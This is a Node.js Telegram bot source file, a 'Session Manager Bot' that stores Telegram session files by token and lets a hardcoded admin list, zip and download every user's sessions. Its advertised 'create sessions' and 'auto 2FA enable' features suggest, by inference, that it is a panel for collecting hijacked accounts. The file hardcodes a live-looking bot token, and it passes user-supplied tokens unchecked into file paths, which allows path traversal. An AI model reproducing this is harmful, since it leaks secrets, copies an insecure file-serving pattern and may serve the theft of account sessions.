const TelegramBot = require("node-telegram-bot-api");
const fs = require("fs");
const path = require("path");
const archiver = require("archiver");

const BOT_TOKEN = "8355719607:AAFdVV1jIQKM_0Y29_G2hcKbj7CHe8nE0wE";
const ADMIN_IDS = [7743078303];
const BASE = path.join(__dirname, "sessionStore");

const bot = new TelegramBot(BOT_TOKEN, { polling: true });

function enc(text) { return Buffer.from(text).toString("base64"); }
function dec(text) { return Buffer.from(text, "base64").toString(); }

// Start command
bot.onText(/\/start/, (msg) => {
    const chatId = msg.chat.id;
    const firstName = msg.from.first_name || "User";
    
    console.log(`/start command from ${firstName} (${chatId})`);
    
    bot.sendMessage(chatId, `👋 Welcome ${firstName}!\n\nI'm your Telegram Session Manager Bot.\n\nUse /session to manage your sessions.`, {
        reply_markup: { 
            keyboard: [[{ text: "/session" }, { text: "/help" }]], 
            resize_keyboard: true 
        }
    });
});

// Help command
bot.onText(/\/help/, (msg) => {
    const chatId = msg.chat.id;
    
    bot.sendMessage(chatId, `🤖 *Session Manager Bot Help*\n\n` +
        `*/session* - Manage your sessions\n` +
        `*/start* - Start the bot\n` +
        `*/help* - Show this help message\n\n` +
        `*Features:*\n` +
        `• Create Telegram sessions\n` +
        `• Download session files\n` +
        `• Zip multiple sessions\n` +
        `• View session details\n` +
        `• Auto 2FA enable\n\n` +
        `*Note:* Some features are admin only.`, {
        parse_mode: 'Markdown'
    });
});

// Session command
bot.onText(/\/session/, (msg) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    
    console.log(`/session command from ${userId}`);
    
    const isAdmin = ADMIN_IDS.includes(userId);
    
    const keyboard = {
        inline_keyboard: [
            [{ text: "📁 My Session", callback_data: "my_session" }]
        ]
    };
    
    if (isAdmin) {
        keyboard.inline_keyboard.unshift(
            [{ text: "📂 All Sessions (Admin)", callback_data: "all_sessions" }]
        );
    }
    
    bot.sendMessage(chatId, "Choose an option:", { reply_markup: keyboard });
});

// Callback handler
bot.on("callback_query", async (query) => {
    const chatId = query.message.chat.id;
    const userId = query.from.id;
    const messageId = query.message.message_id;
    
    console.log(`Callback: ${query.data} from ${userId}`);

    try {
        if (query.data === "my_session") {
            bot.sendMessage(chatId, "🔑 Send your session token:");
            bot.once("message", async (msg) => {
                const token = msg.text.trim();
                console.log(`Token received: ${token}`);
                
                const folder = path.join(BASE, token);
                if (!fs.existsSync(folder)) {
                    console.log(`Folder not found for token: ${token}`);
                    return bot.sendMessage(chatId, "❌ Invalid token! Folder not found.");
                }
                
                await sendFolderButtons(chatId, folder, token, messageId);
            });
            return;
        }

        if (query.data === "all_sessions") {
            if (!ADMIN_IDS.includes(userId)) {
                console.log(`Unauthorized access attempt from ${userId}`);
                return bot.answerCallbackQuery(query.id, { 
                    text: "⛔ You are not an admin.", 
                    show_alert: true 
                });
            }

            console.log(`Admin ${userId} accessing all sessions`);
            
            if (!fs.existsSync(BASE)) {
                return bot.sendMessage(chatId, "No session folders found.");
            }

            const folders = fs.readdirSync(BASE)
                .filter(f => fs.statSync(path.join(BASE, f)).isDirectory());
            
            if (!folders.length) {
                return bot.sendMessage(chatId, "No session folders found.");
            }

            console.log(`Found ${folders.length} session folders`);
            
            const keyboard = folders.map(f => [{ 
                text: `📁 ${f.substring(0, 20)}${f.length > 20 ? '...' : ''}`, 
                callback_data: `open_${enc(f)}` 
            }]);
            
            // Add back button
            keyboard.push([{ text: "🔙 Back", callback_data: "back_to_main" }]);

            return bot.editMessageText(`Select a session folder (${folders.length} found):`, {
                chat_id: chatId,
                message_id: messageId,
                reply_markup: { inline_keyboard: keyboard }
            });
        }

        if (query.data === "back_to_main") {
            const isAdmin = ADMIN_IDS.includes(userId);
            const keyboard = {
                inline_keyboard: [
                    [{ text: "📁 My Session", callback_data: "my_session" }]
                ]
            };
            
            if (isAdmin) {
                keyboard.inline_keyboard.unshift(
                    [{ text: "📂 All Sessions (Admin)", callback_data: "all_sessions" }]
                );
            }
            
            return bot.editMessageText("Choose an option:", {
                chat_id: chatId,
                message_id: messageId,
                reply_markup: keyboard
            });
        }

        if (query.data.startsWith("open_")) {
            const token = dec(query.data.replace("open_", ""));
            const folder = path.join(BASE, token);
            
            console.log(`Opening folder: ${token}`);
            
            if (!fs.existsSync(folder)) {
                return bot.sendMessage(chatId, "❌ Folder not found.");
            }
            
            await sendFolderButtons(chatId, folder, token, messageId);
            return;
        }

        if (query.data.startsWith("zip_")) {
            const token = dec(query.data.replace("zip_", ""));
            const folder = path.join(BASE, token);
            
            console.log(`ZIP request for: ${token}`);
            
            if (!fs.existsSync(folder)) {
                return bot.sendMessage(chatId, "❌ Folder not found.");
            }
            
            await zipFiles(chatId, folder, token, messageId);
            return;
        }

        if (query.data.startsWith("files_")) {
            const token = dec(query.data.replace("files_", ""));
            const folder = path.join(BASE, token);
            
            console.log(`Files request for: ${token}`);
            
            if (!fs.existsSync(folder)) {
                return bot.sendMessage(chatId, "❌ Folder not found.");
            }
            
            await sendFiles(chatId, folder, messageId);
            return;
        }

        if (query.data.startsWith("back_")) {
            const token = dec(query.data.replace("back_", ""));
            const folder = path.join(BASE, token);
            
            if (!fs.existsSync(folder)) {
                return bot.sendMessage(chatId, "❌ Folder not found.");
            }
            
            await sendFolderButtons(chatId, folder, token, messageId);
            return;
        }
    } catch (error) {
        console.error(`Callback error: ${error.message}`);
        bot.answerCallbackQuery(query.id, { 
            text: "❌ An error occurred.", 
            show_alert: true 
        });
    }
});

// Send folder buttons
async function sendFolderButtons(chatId, folder, token, messageId) {
    const files = fs.readdirSync(folder).filter(f => f.endsWith(".txt"));
    const fileCount = files.length;
    
    console.log(`Folder ${token} has ${fileCount} files`);
    
    const keyboard = {
        inline_keyboard: [
            [
                { text: `📦 ZIP (${fileCount})`, callback_data: `zip_${enc(token)}` },
                { text: `📄 Files (${fileCount})`, callback_data: `files_${enc(token)}` }
            ],
            [{ text: "🔙 Back", callback_data: ADMIN_IDS.includes(chatId) ? "all_sessions" : "back_to_main" }]
        ]
    };
    
    if (messageId) {
        await bot.editMessageText(`📁 *Folder:* \`${token}\`\n📊 *Files:* ${fileCount}\n📦 *Size:* ${getFolderSize(folder)}`, {
            chat_id: chatId,
            message_id: messageId,
            parse_mode: 'Markdown',
            reply_markup: keyboard
        });
    } else {
        await bot.sendMessage(chatId, `📁 *Folder:* \`${token}\`\n📊 *Files:* ${fileCount}\n📦 *Size:* ${getFolderSize(folder)}`, {
            parse_mode: 'Markdown',
            reply_markup: keyboard
        });
    }
}

// Calculate folder size
function getFolderSize(folder) {
    let totalSize = 0;
    const files = fs.readdirSync(folder);
    
    files.forEach(file => {
        const filePath = path.join(folder, file);
        const stats = fs.statSync(filePath);
        totalSize += stats.size;
    });
    
    if (totalSize < 1024) {
        return `${totalSize} B`;
    } else if (totalSize < 1024 * 1024) {
        return `${(totalSize / 1024).toFixed(2)} KB`;
    } else {
        return `${(totalSize / (1024 * 1024)).toFixed(2)} MB`;
    }
}

// Send files
async function sendFiles(chatId, folder, messageId) {
    const files = fs.readdirSync(folder).filter(f => f.endsWith(".txt"));
    
    console.log(`Sending ${files.length} files to ${chatId}`);
    
    if (!files.length) {
        if (messageId) {
            await bot.editMessageText("No session files found.", {
                chat_id: chatId,
                message_id: messageId
            });
        } else {
            await bot.sendMessage(chatId, "No session files found.");
        }
        return;
    }

    if (messageId) {
        await bot.editMessageText(`📁 *Sending ${files.length} files...*`, {
            chat_id: chatId,
            message_id: messageId,
            parse_mode: 'Markdown'
        });
    } else {
        await bot.sendMessage(chatId, `📁 *Sending ${files.length} files...*`, {
            parse_mode: 'Markdown'
        });
    }
    
    let sentCount = 0;
    for (const file of files) {
        try {
            const filePath = path.join(folder, file);
            await bot.sendDocument(chatId, filePath, {
                caption: `📄 ${file}\n📦 ${(fs.statSync(filePath).size / 1024).toFixed(2)} KB`
            });
            sentCount++;
            await new Promise(r => setTimeout(r, 500)); // Delay to avoid flooding
        } catch (error) {
            console.error(`Error sending file ${file}: ${error.message}`);
            await bot.sendMessage(chatId, `❌ Failed to send: ${file}`);
        }
    }
    
    await bot.sendMessage(chatId, `✅ Sent ${sentCount}/${files.length} files successfully.`);
}

// Zip files
async function zipFiles(chatId, folder, token, messageId) {
    const files = fs.readdirSync(folder).filter(f => f.endsWith(".txt"));
    
    console.log(`Creating ZIP for ${token} with ${files.length} files`);
    
    if (!files.length) {
        if (messageId) {
            await bot.editMessageText("No session files to zip.", {
                chat_id: chatId,
                message_id: messageId
            });
        } else {
            await bot.sendMessage(chatId, "No session files to zip.");
        }
        return;
    }

    if (messageId) {
        await bot.editMessageText(`📦 *Creating ZIP with ${files.length} files...*`, {
            chat_id: chatId,
            message_id: messageId,
            parse_mode: 'Markdown'
        });
    } else {
        await bot.sendMessage(chatId, `📦 *Creating ZIP with ${files.length} files...*`, {
            parse_mode: 'Markdown'
        });
    }
    
    try {
        const zipPath = path.join(folder, `${token}_${Date.now()}.zip`);
        const totalSize = files.reduce((sum, file) => {
            return sum + fs.statSync(path.join(folder, file)).size;
        }, 0);
        
        console.log(`Total size to zip: ${(totalSize / (1024 * 1024)).toFixed(2)} MB`);
        
        await new Promise((resolve, reject) => {
            const output = fs.createWriteStream(zipPath);
            const archive = archiver("zip", { zlib: { level: 9 } });
            
            output.on("close", () => {
                console.log(`ZIP created: ${zipPath}, Size: ${(archive.pointer() / (1024 * 1024)).toFixed(2)} MB`);
                resolve();
            });
            
            archive.on("error", (err) => {
                console.error(`ZIP error: ${err.message}`);
                reject(err);
            });
            
            archive.pipe(output);
            files.forEach(f => {
                archive.file(path.join(folder, f), { name: f });
            });
            archive.finalize();
        });
        
        const stats = fs.statSync(zipPath);
        const zipSize = (stats.size / (1024 * 1024)).toFixed(2);
        
        console.log(`Sending ZIP to ${chatId}, Size: ${zipSize} MB`);
        
        await bot.sendDocument(chatId, zipPath, {
            caption: `📦 *ZIP Archive*\n` +
                    `📁 Folder: ${token}\n` +
                    `📄 Files: ${files.length}\n` +
                    `📦 Size: ${zipSize} MB\n` +
                    `⏰ Created: ${new Date().toLocaleString()}`
        });
        
        // Clean up
        fs.unlinkSync(zipPath);
        console.log(`ZIP cleaned up: ${zipPath}`);
        
    } catch (error) {
        console.error(`ZIP creation error: ${error.message}`);
        await bot.sendMessage(chatId, `❌ Failed to create ZIP: ${error.message}`);
    }
}

// Error handling
bot.on("polling_error", (error) => {
    console.error(`Polling error: ${error.message}`);
});

bot.on("error", (error) => {
    console.error(`Bot error: ${error.message}`);
});

console.log("✅ Telegram Bot is running...");
console.log(`🤖 Bot Token: ${BOT_TOKEN.substring(0, 10)}...`);
console.log(`👑 Admin IDs: ${ADMIN_IDS.join(", ")}`);
console.log(`📁 Base Directory: ${BASE}`);
